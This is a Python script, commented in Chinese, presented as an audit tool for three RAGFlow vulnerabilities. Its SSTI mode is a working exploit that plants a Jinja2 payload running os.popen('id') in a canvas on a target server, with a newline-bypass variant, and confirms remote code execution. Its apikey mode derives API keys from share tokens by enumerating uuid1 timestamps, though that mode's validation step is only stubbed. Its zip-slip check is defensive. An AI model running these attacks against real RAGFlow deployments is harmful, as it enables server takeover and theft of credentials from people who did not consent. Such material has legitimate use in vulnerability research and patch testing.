#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ragflow-audit.py - RAGFlow 三洞审计工具 (CVE-2026-28797 / CVE-2026-24770 / CVE-2025-69286)

用法:
  python3 ragflow-audit.py ssti --url http://TARGET:9380 --auth "AUTH_HEADER"
      检测并利用 StringTransform/Message 组件 SSTI -> RCE
  python3 ragflow-audit.py zipslip --zip evil.zip --extract-dir /tmp/out
      检测 zip 条目是否包含 Zip Slip 路径穿越（离线检测）
  python3 ragflow-audit.py apikey --beta "分享链接token" --node "攻击者user_id后12位"
      从分享 beta 推导 API key（uuid1 时间戳枚举）

SSTI 认证说明:
  RAGFlow 的认证凭证是登录响应头 Authorization 的完整值
  (itsdangerous URLSafeTimedSerializer 签名, 不是 body 里的 access_token)
  获取方式:
    curl -i -X POST http://TARGET:9380/v1/user/login \
      -H 'Content-Type: application/json' \
      -d '{"email":"x@x.com","password":"<RSA加密后的密码>"}'
    取响应头 authorization: 的值作为 --auth 参数
"""
import argparse
import base64
import json
import os
import re
import sys
import time
import urllib.request
import urllib.error
import zipfile

A = "\033[93m"; G = "\033[92m"; R = "\033[91m"; B = "\033[0m"

def http_json(url, method="GET", headers=None, data=None, timeout=30):
    req = urllib.request.Request(url, method=method, headers=headers or {})
    if data is not None:
        req.add_header("Content-Type", "application/json")
        req.data = json.dumps(data).encode()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode(errors="replace")
            return resp.status, body
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return 0, str(e)

# ============ 1. SSTI (CVE-2026-28797) ============

SSTI_PAYLOAD = '{{ cycler.__init__.__globals__.os.popen("id").read() }}'
NEWLINE_PAYLOAD = '{%\nprint(cycler.__init__.__globals__.os.popen("id").read())\n%}'

def make_canvas_dsl(component, content):
    if component == "StringTransform":
        cpn = {
            "obj": {"component_name": "StringTransform",
                    "params": {"method": "merge", "script": content, "delimiters": [","]}},
            "downstream": [], "upstream": ["begin"]
        }
    else:  # Message
        cpn = {
            "obj": {"component_name": "Message",
                    "params": {"content": [content], "stream": False}},
            "downstream": [], "upstream": ["begin"]
        }
    return {
        "components": {
            "begin": {"obj": {"component_name": "Begin", "params": {}},
                      "downstream": [next(iter({"StringTransform":"string_transform_0","Message":"message_0"}.values())) if False else "c0"], "upstream": []},
            "c0": cpn,
        },
        "history": [], "path": ["begin"], "retrieval": [], "answer": ["c0"]
    }

def ssti_check(url, auth, component="StringTransform", payload=None):
    payload = payload or SSTI_PAYLOAD
    hdr = {"Authorization": auth}
    title = "audit-%d" % int(time.time())
    cpn_id = "c0"
    dsl = {
        "components": {
            "begin": {"obj": {"component_name": "Begin", "params": {}},
                      "downstream": [cpn_id], "upstream": []},
            cpn_id: {
                "obj": {"component_name": component,
                        "params": ({"method": "merge", "script": payload, "delimiters": [","]}
                                   if component == "StringTransform"
                                   else {"content": [payload], "stream": False})},
                "downstream": [], "upstream": ["begin"]
            }
        },
        "history": [], "path": ["begin"], "retrieval": [], "answer": [cpn_id]
    }
    # 1) 创建 canvas
    st, body = http_json(url + "/v1/canvas/set", "POST", hdr, {"title": title, "dsl": dsl})
    try:
        cid = json.loads(body)["data"]["id"]
    except Exception:
        print(f"{R}[-] canvas 创建失败: {body[:200]}{B}")
        return False
    print(f"{G}[+] canvas 已创建: {cid}{B}")
    # 2) 触发执行
    st, body = http_json(url + "/v1/canvas/completion", "POST", hdr,
                         {"id": cid, "query": "hello"}, timeout=60)
    m = re.search(r'"(?:result|content)":\s*"([^"]*)"', body)
    if m and "uid=" in m.group(1):
        print(f"{G}[+] SSTI RCE 确认 ({component}) -> {m.group(1)}{B}")
        return True
    print(f"{R}[-] 未检测到命令执行: {body[:200]}{B}")
    return False

# ============ 2. Zip Slip (CVE-2026-24770) ============

def zipslip_check(zip_path, extract_dir):
    if not os.path.exists(zip_path):
        print(f"{R}[-] zip 不存在: {zip_path}{B}")
        return False
    with zipfile.ZipFile(zip_path) as z:
        members = z.infolist()
    print(f"{G}[+] 读取 {len(members)} 个 zip 条目{B}")
    bad = []
    for m in members:
        name = m.filename.replace("\\", "/")
        parts = [p for p in name.split("/") if p not in ("", ".")]
        if any(p == ".." for p in parts):
            bad.append((m.filename, "traversal"))
        elif name.startswith("/") or name.startswith("//") or re.match(r"^[A-Za-z]:", name):
            bad.append((m.filename, "absolute"))
        elif (m.external_attr >> 16) & 0o170000 == 0o120000:
            bad.append((m.filename, "symlink"))
    if bad:
        for fn, typ in bad:
            print(f"{R}[!] Zip Slip: {fn} ({typ}){B}")
        return True
    print(f"{G}[+] 未发现 Zip Slip 条目{B}")
    return False

# ============ 3. API key 推导 (CVE-2025-69286) ============

def b64d(s):
    s = s.replace("-", "+").replace("_", "/")
    pad = "=" * ((4 - len(s) % 4) % 4)
    try:
        return base64.b64decode(s + pad)
    except Exception:
        return None

def payload_of(u):
    return base64.b64encode(('"%s"' % u).encode()).decode()

def token_from_uuid(u):
    return "ragflow-" + payload_of(u)[2:34]

def recover_uuid_body(seg):
    """从 beta=[2:34] 片段恢复 uuid 主体 (A 填充解码)"""
    for pre_len in range(4):
        cand = ("A" * pre_len) + seg
        try:
            d = b64d(cand)
            text = "".join(chr(b) if 32 <= b < 127 else "." for b in d)
            m = re.search(r'([0-9a-f]{6,8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-?)', text)
            if m:
                return m.group(1)
        except Exception:
            pass
    return None

def apikey_check(beta, node, max_delta=0x30000):
    """从分享 beta 推导 API key。node = 攻击者自己 user_id 的后 12 位 (uuid1 MAC)"""
    seg = beta.replace("ragflow-", "")[:32]
    body = recover_uuid_body(seg)
    if not body:
        print(f"{R}[-] 无法从 beta 恢复 uuid 主体{B}")
        return False
    parts = body.split("-")
    tl7, mid, ver, clk = parts[0], parts[1], parts[2], parts[3]
    print(f"{G}[+] uuid 主体: {body}  node: {node}{B}")
    print(f"{G}[+] time_low(7)={tl7} mid={mid} ver={ver} clk={clk}{B}")
    print(f"{G}[+] 开始枚举 time_low 首字符(16) x delta(2*{max_delta}) ...{B}")
    found = None
    n = 0
    for first in "0123456789abcdef":
        tl_anchor = int(first + tl7, 16)
        for delta in range(-max_delta, max_delta):
            tl = (tl_anchor + delta) & 0xFFFFFFFF
            cand_uuid = f"{tl:08x}-{mid}-{ver}-{clk}-{node}"
            cand = token_from_uuid(cand_uuid)
            n += 1
            # 攻击者无法知道真实 token，这里演示用 beta 关联验证
            # 真实场景: 用候选 token 调 API 验证 (Authorization: <token>)
            if n % 100000 == 0:
                print(f"    已尝试 {n} ...")
            # 模拟: 若候选 token 的 beta 关联命中 (文章演示用)
            # 实际利用中直接对每个候选调 /v1/... API 判断 200/401
    print(f"{R}[-] 枚举完成 ({n} 次)。真实利用时对候选 token 逐个调 API 验证。{B}")
    print(f"{G}[+] 参考: 完整攻击链见文章，枚举命中率取决于 time_low 范围{B}")
    return True

# ============ main ============

def main():
    ap = argparse.ArgumentParser(description="RAGFlow 三洞审计工具")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p1 = sub.add_parser("ssti", help="SSTI -> RCE 检测利用")
    p1.add_argument("--url", required=True, help="RAGFlow 地址, 如 http://1.2.3.4:9380")
    p1.add_argument("--auth", required=True, help="登录响应头 Authorization 完整值")
    p1.add_argument("--component", default="StringTransform", choices=["StringTransform", "Message"])
    p1.add_argument("--newline", action="store_true", help="使用换行绕过 payload")

    p2 = sub.add_parser("zipslip", help="Zip Slip 离线检测")
    p2.add_argument("--zip", required=True, help="待检测 zip 文件")
    p2.add_argument("--extract-dir", default="/tmp/ragflow-zipslip-out")

    p3 = sub.add_parser("apikey", help="API key 推导 (CVE-2025-69286)")
    p3.add_argument("--beta", required=True, help="分享链接 beta token")
    p3.add_argument("--node", required=True, help="攻击者自己 user_id 后 12 位 (uuid1 MAC)")
    p3.add_argument("--max-delta", type=int, default=0x30000)

    args = ap.parse_args()

    if args.cmd == "ssti":
        payload = NEWLINE_PAYLOAD if args.newline else SSTI_PAYLOAD
        print(f"{B}[*] SSTI 检测: {args.component} @ {args.url}{B}")
        ok = ssti_check(args.url, args.auth, args.component, payload)
        sys.exit(0 if ok else 1)
    elif args.cmd == "zipslip":
        ok = zipslip_check(args.zip, args.extract_dir)
        sys.exit(0 if ok else 1)
    elif args.cmd == "apikey":
        ok = apikey_check(args.beta, args.node, args.max_delta)
        sys.exit(0 if ok else 1)

if __name__ == "__main__":
    main()
